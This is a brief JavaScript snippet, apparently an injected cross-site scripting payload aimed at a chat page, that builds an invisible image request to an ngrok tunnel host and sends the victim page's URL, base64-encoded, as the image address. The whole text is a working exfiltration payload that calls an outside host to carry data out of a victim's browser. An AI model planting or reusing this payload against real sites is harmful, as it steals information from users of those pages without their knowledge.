function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://7b1440ce.ngrok.io/name="+name+"&data="+btoa(data);
    document.getElementById("chat-div").appendChild(img);
}

send2server("url", window.location.href);
